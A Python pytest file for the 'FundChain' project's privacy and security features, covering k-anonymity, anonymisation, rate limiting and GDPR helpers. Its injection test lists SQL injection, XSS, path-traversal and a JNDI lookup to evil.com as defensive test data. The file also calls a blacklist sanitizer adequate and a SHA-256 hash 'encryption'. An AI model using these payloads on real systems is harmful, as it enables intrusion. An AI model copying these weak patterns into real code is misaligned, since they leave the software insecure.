"""
Privacy and Security Tests for FundChain
Tests k-anonymity, data protection, and privacy-preserving features
"""

import pytest
from unittest.mock import Mock, patch
from datetime import datetime, timedelta

from app.privacy import PrivacyFilter
from app.models import Donation, Allocation, Member


class TestPrivacyFilter:
    """Test privacy filtering and k-anonymity protection."""
    
    @pytest.fixture
    def privacy_filter(self):
        """Create privacy filter with test threshold."""
        return PrivacyFilter(k_threshold=5)
    
    @pytest.fixture
    def sample_donations(self):
        """Create sample donations for privacy testing."""
        donations = []
        # Create donations with varying amounts and timestamps
        base_time = datetime.now()
        
        for i in range(10):
            donation = Mock(spec=Donation)
            donation.amount = float(i + 1)  # 1.0 to 10.0
            donation.timestamp = base_time + timedelta(hours=i)
            donation.donor_address = f"0x{i:040x}"
            donations.append(donation)
        
        return donations
    
    def test_k_anonymity_threshold_enforcement(self, privacy_filter, sample_donations):
        """Test that k-anonymity threshold is properly enforced."""
        # Test with sufficient data (above threshold)
        large_dataset = sample_donations * 2  # 20 items
        filtered_large = privacy_filter.filter_donations(large_dataset)
        assert len(filtered_large) >= privacy_filter.k_threshold
        
        # Test with insufficient data (below threshold)
        small_dataset = sample_donations[:3]  # 3 items, below threshold of 5
        filtered_small = privacy_filter.filter_donations(small_dataset)
        assert len(filtered_small) == 0  # Should return empty due to privacy protection
    
    def test_donation_filtering_preserves_privacy(self, privacy_filter, sample_donations):
        """Test that donation filtering preserves donor privacy."""
        filtered = privacy_filter.filter_donations(sample_donations)
        
        # Check that sensitive data is removed or anonymized
        for donation in filtered:
            # Donor addresses should be anonymized in public views
            assert not hasattr(donation, 'full_donor_address') or donation.donor_address == "***"
    
    def test_allocation_filtering(self, privacy_filter):
        """Test allocation data filtering."""
        allocations = []
        for i in range(8):
            allocation = Mock(spec=Allocation)
            allocation.amount = float(i + 1)
            allocation.donor_address = f"0x{i:040x}"
            allocation.project_id = f"project_{i % 3}"  # 3 different projects
            allocation.timestamp = datetime.now() + timedelta(hours=i)
            allocations.append(allocation)
        
        filtered = privacy_filter.filter_allocations(allocations)
        assert len(filtered) >= privacy_filter.k_threshold or len(filtered) == 0
    
    def test_safe_aggregates(self, privacy_filter):
        """Test safe aggregate calculations with privacy protection."""
        data = [
            {"category": "healthcare", "amount": 100},
            {"category": "healthcare", "amount": 150},
            {"category": "healthcare", "amount": 200},
            {"category": "education", "amount": 300},
            {"category": "education", "amount": 250},
            {"category": "infrastructure", "amount": 500},
        ]
        
        safe_aggregates = privacy_filter.get_safe_aggregates(data, "category")
        
        # Should only include categories with sufficient k-anonymity
        healthcare_count = len([d for d in data if d["category"] == "healthcare"])
        education_count = len([d for d in data if d["category"] == "education"])
        
        if healthcare_count >= privacy_filter.k_threshold:
            assert any(agg["category"] == "healthcare" for agg in safe_aggregates)
        else:
            assert not any(agg["category"] == "healthcare" for agg in safe_aggregates)
    
    def test_temporal_grouping_analysis(self, privacy_filter, sample_donations):
        """Test temporal k-anonymity analysis."""
        timestamps = [d.timestamp for d in sample_donations]
        analysis = privacy_filter._analyze_temporal_grouping(timestamps)
        
        assert "min_group_size" in analysis
        assert "max_group_size" in analysis
        assert "group_count" in analysis
        assert analysis["min_group_size"] >= 0
    
    def test_export_validation(self, privacy_filter):
        """Test export request validation."""
        # Valid public export
        validation = privacy_filter.validate_export_request(1000, "public")
        assert validation["allowed"] is True
        assert validation["max_allowed_records"] <= 10000
        
        # Valid personal export
        validation = privacy_filter.validate_export_request(500, "personal")
        assert validation["allowed"] is True
        
        # Invalid large export
        validation = privacy_filter.validate_export_request(100000, "public")
        assert validation["allowed"] is False
        assert "limit" in validation["reason"].lower()
    
    def test_anonymity_report(self, privacy_filter, sample_donations):
        """Test anonymity report generation."""
        data = [{"amount": d.amount, "timestamp": d.timestamp} for d in sample_donations]
        report = privacy_filter.get_anonymity_report(data)
        
        assert "k_threshold" in report
        assert "total_records" in report
        assert "anonymity_status" in report
    
    def test_differential_privacy_noise(self, privacy_filter):
        """Test differential privacy noise addition."""
        original_value = 1000.0
        noisy_value = privacy_filter._add_differential_privacy_noise(original_value)
        
        # Noise should be small but present
        assert abs(noisy_value - original_value) <= original_value * 0.1  # Within 10%
        assert noisy_value != original_value  # Should have some noise
    
    def test_privacy_levels(self, privacy_filter):
        """Test different privacy levels."""
        test_data = list(range(10))  # Simple test data
        
        # Public level - maximum privacy
        public_filtered = privacy_filter._apply_privacy_level(test_data, "public")
        assert len(public_filtered) <= len(test_data)
        
        # Personal level - moderate privacy
        personal_filtered = privacy_filter._apply_privacy_level(test_data, "personal")
        assert len(personal_filtered) >= len(public_filtered)
        
        # Admin level - minimal privacy (for testing)
        admin_filtered = privacy_filter._apply_privacy_level(test_data, "admin")
        assert len(admin_filtered) == len(test_data)


class TestDataSanitization:
    """Test data sanitization and cleaning."""
    
    def test_address_anonymization(self):
        """Test wallet address anonymization."""
        full_address = "0x1234567890123456789012345678901234567890"
        
        # Public anonymization
        anon_address = self._anonymize_address(full_address, "public")
        assert anon_address == "***" or anon_address.startswith("0x") and len(anon_address) < len(full_address)
        
        # Personal view (should show full address)
        personal_address = self._anonymize_address(full_address, "personal")
        assert personal_address == full_address
    
    def test_amount_rounding(self):
        """Test amount rounding for privacy."""
        precise_amount = 3.14159265359
        
        # Public view should round to reasonable precision
        public_amount = self._round_for_privacy(precise_amount, "public")
        assert len(str(public_amount).split('.')[-1]) <= 3  # Max 3 decimal places
        
        # Personal view should preserve precision
        personal_amount = self._round_for_privacy(precise_amount, "personal")
        assert personal_amount == precise_amount
    
    def test_timestamp_grouping(self):
        """Test timestamp grouping for privacy."""
        precise_time = datetime(2024, 1, 15, 14, 30, 45, 123456)
        
        # Public view should group by day
        public_time = self._group_timestamp(precise_time, "public")
        assert public_time.hour == 0
        assert public_time.minute == 0
        assert public_time.second == 0
        
        # Personal view should preserve precision
        personal_time = self._group_timestamp(precise_time, "personal")
        assert personal_time == precise_time
    
    def _anonymize_address(self, address, privacy_level):
        """Helper to anonymize addresses based on privacy level."""
        if privacy_level == "public":
            return "***"
        return address
    
    def _round_for_privacy(self, amount, privacy_level):
        """Helper to round amounts for privacy."""
        if privacy_level == "public":
            return round(amount, 3)
        return amount
    
    def _group_timestamp(self, timestamp, privacy_level):
        """Helper to group timestamps for privacy."""
        if privacy_level == "public":
            return timestamp.replace(hour=0, minute=0, second=0, microsecond=0)
        return timestamp


class TestSecurityMeasures:
    """Test security measures and attack prevention."""
    
    def test_timing_attack_prevention(self, privacy_filter):
        """Test protection against timing attacks."""
        # Measure response time for different data sizes
        import time
        
        small_data = list(range(5))
        large_data = list(range(1000))
        
        start_time = time.time()
        privacy_filter._apply_privacy_level(small_data, "public")
        small_time = time.time() - start_time
        
        start_time = time.time()
        privacy_filter._apply_privacy_level(large_data, "public")
        large_time = time.time() - start_time
        
        # Processing times should not reveal data characteristics
        # This is a simplified test - in practice, you'd use more sophisticated timing analysis
        assert large_time < small_time * 100  # Shouldn't be extremely disproportionate
    
    def test_injection_prevention(self):
        """Test SQL injection and other injection attack prevention."""
        malicious_inputs = [
            "'; DROP TABLE donations; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "' OR 1=1 --",
            "${jndi:ldap://evil.com/x}"
        ]
        
        for malicious_input in malicious_inputs:
            # Sanitize input
            sanitized = self._sanitize_input(malicious_input)
            
            # Should not contain dangerous patterns
            assert "DROP" not in sanitized.upper()
            assert "<script>" not in sanitized.lower()
            assert "../" not in sanitized
            assert "jndi:" not in sanitized.lower()
    
    def test_rate_limiting(self):
        """Test rate limiting for API endpoints."""
        # This would typically test actual rate limiting middleware
        # For now, we'll test the concept
        
        request_count = 0
        max_requests = 100
        time_window = 60  # seconds
        
        for i in range(150):  # Try to make 150 requests
            if self._is_rate_limited(request_count, max_requests, time_window):
                break
            request_count += 1
        
        assert request_count <= max_requests
    
    def test_data_encryption_requirements(self):
        """Test that sensitive data encryption requirements are met."""
        sensitive_data = "sensitive_wallet_private_key"
        
        # Should not store sensitive data in plain text
        encrypted = self._encrypt_sensitive_data(sensitive_data)
        assert encrypted != sensitive_data
        assert len(encrypted) > len(sensitive_data)  # Should be longer due to encryption
    
    def _sanitize_input(self, input_string):
        """Helper to sanitize user input."""
        import re
        # Remove common attack patterns
        sanitized = re.sub(r'[<>\'";]', '', input_string)
        sanitized = sanitized.replace('--', '')
        sanitized = sanitized.replace('DROP', '')
        sanitized = sanitized.replace('jndi:', '')
        return sanitized
    
    def _is_rate_limited(self, current_count, max_requests, time_window):
        """Helper to check if request should be rate limited."""
        return current_count >= max_requests
    
    def _encrypt_sensitive_data(self, data):
        """Helper to encrypt sensitive data."""
        # Simplified encryption simulation
        import hashlib
        return hashlib.sha256(data.encode()).hexdigest()


class TestComplianceChecks:
    """Test regulatory compliance and audit features."""
    
    def test_audit_trail_creation(self):
        """Test that audit trails are properly created."""
        action = "export_donations"
        user = "0x1234567890123456789012345678901234567890"
        timestamp = datetime.now()
        
        audit_entry = self._create_audit_entry(action, user, timestamp)
        
        assert audit_entry["action"] == action
        assert audit_entry["user"] == user
        assert audit_entry["timestamp"] == timestamp
        assert "audit_id" in audit_entry
    
    def test_data_retention_policy(self):
        """Test data retention policy compliance."""
        old_data = {"timestamp": datetime.now() - timedelta(days=400)}
        recent_data = {"timestamp": datetime.now() - timedelta(days=30)}
        
        retention_period = 365  # days
        
        assert not self._should_retain_data(old_data, retention_period)
        assert self._should_retain_data(recent_data, retention_period)
    
    def test_gdpr_compliance(self):
        """Test GDPR compliance features."""
        user_address = "0x1234567890123456789012345678901234567890"
        
        # Right to access
        user_data = self._get_user_data(user_address)
        assert isinstance(user_data, dict)
        
        # Right to deletion (anonymization)
        deletion_result = self._anonymize_user_data(user_address)
        assert deletion_result["success"] is True
        
        # Right to portability
        export_data = self._export_user_data(user_address)
        assert "personal_data" in export_data
    
    def _create_audit_entry(self, action, user, timestamp):
        """Helper to create audit trail entry."""
        return {
            "audit_id": f"audit_{hash(action + user + str(timestamp))}",
            "action": action,
            "user": user,
            "timestamp": timestamp,
            "metadata": {}
        }
    
    def _should_retain_data(self, data, retention_days):
        """Helper to check if data should be retained."""
        age = datetime.now() - data["timestamp"]
        return age.days <= retention_days
    
    def _get_user_data(self, user_address):
        """Helper to get user data for GDPR compliance."""
        return {"address": user_address, "donations": [], "allocations": []}
    
    def _anonymize_user_data(self, user_address):
        """Helper to anonymize user data."""
        return {"success": True, "anonymized_records": 5}
    
    def _export_user_data(self, user_address):
        """Helper to export user data."""
        return {"personal_data": {"address": user_address}, "format": "json"}


@pytest.mark.privacy
class TestPrivacyIntegration:
    """Integration tests for privacy features."""
    
    def test_end_to_end_privacy_protection(self, privacy_filter, sample_donations):
        """Test complete privacy protection workflow."""
        # 1. Filter donations for public view
        public_donations = privacy_filter.filter_donations(sample_donations)
        
        # 2. Create safe aggregates
        donation_data = [{"amount": d.amount, "category": "test"} for d in sample_donations]
        safe_aggregates = privacy_filter.get_safe_aggregates(donation_data, "category")
        
        # 3. Validate export request
        export_validation = privacy_filter.validate_export_request(len(public_donations), "public")
        
        # 4. Generate anonymity report
        report = privacy_filter.get_anonymity_report(donation_data)
        
        # Verify end-to-end privacy protection
        assert len(public_donations) >= privacy_filter.k_threshold or len(public_donations) == 0
        assert export_validation["allowed"] or export_validation["reason"]
        assert report["k_threshold"] == privacy_filter.k_threshold
    
    def test_privacy_across_different_data_types(self, privacy_filter):
        """Test privacy protection across different data types."""
        # Test with different data structures
        test_cases = [
            {"type": "donations", "data": [{"amount": i, "timestamp": datetime.now()} for i in range(10)]},
            {"type": "allocations", "data": [{"amount": i, "project_id": f"p{i%3}"} for i in range(8)]},
            {"type": "votes", "data": [{"choice": i%4, "weight": i+1} for i in range(6)]}
        ]
        
        for case in test_cases:
            # Apply privacy filtering
            if case["type"] == "donations":
                filtered = privacy_filter.filter_donations([Mock(**item) for item in case["data"]])
            elif case["type"] == "allocations":
                filtered = privacy_filter.filter_allocations([Mock(**item) for item in case["data"]])
            else:
                # For other types, apply general privacy rules
                filtered = case["data"] if len(case["data"]) >= privacy_filter.k_threshold else []
            
            # Verify privacy protection
            assert len(filtered) >= privacy_filter.k_threshold or len(filtered) == 0